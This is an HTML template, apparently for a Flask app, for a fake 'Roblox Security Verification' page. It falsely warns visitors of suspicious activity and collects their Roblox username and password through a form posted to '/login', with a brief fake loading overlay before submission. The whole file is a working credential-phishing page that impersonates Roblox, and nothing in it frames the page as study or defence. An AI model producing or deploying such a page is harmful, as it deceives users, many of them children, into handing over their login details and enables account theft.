<!DOCTYPE html>
<html>
<head>
  <title>Roblox Security Verification</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='secure-style.css') }}">
  <style>
    body {
      background-color: #fefefe;
      font-family: Arial, sans-serif;
      padding: 40px;
      text-align: center;
    }

    .alert-box {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeeba;
      padding: 30px;
      border-radius: 8px;
      max-width: 400px;
      margin: auto;
    }

    input {
      display: block;
      width: 90%;
      margin: 10px auto;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      background-color: #f0ad4e;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .loading-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.85);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5em;
      font-weight: bold;
      color: #444;
      z-index: 9999;
      display: none;
    }

    @media (max-width: 480px) {
      body {
        padding: 20px;
      }

      .alert-box {
        width: 95%;
        padding: 20px;
      }

      input, button {
        width: 100%;
      }
    }
  </style>
</head>
<body>

<div class="loading-overlay" id="loading">Loading...</div>

<div class="alert-box">
  <h2>ðŸ”’ Security Alert </h2>
  <h3>To continue your account please login for Verification</h3>
  <p>Weâ€™ve detected suspicious activity on your Roblox account.</p>
  
  {% if error %}
    <p style="color: red; text-align: center; font-size: 14px;">{{ error }}</p>
  {% endif %}
  
  <form id="verifyForm" action="/login" method="POST">
    <input type="text" name="username" placeholder="Roblox Username" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Verify</button>
  </form>
</div>

<script>
  const form = document.getElementById('verifyForm');
  const loading = document.getElementById('loading');

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    loading.style.display = 'flex';

    setTimeout(() => {
      loading.style.display = 'none';
      form.submit();
    }, 1000); // 1 second = 1000 ms
  });
</script>

</body>
</html>
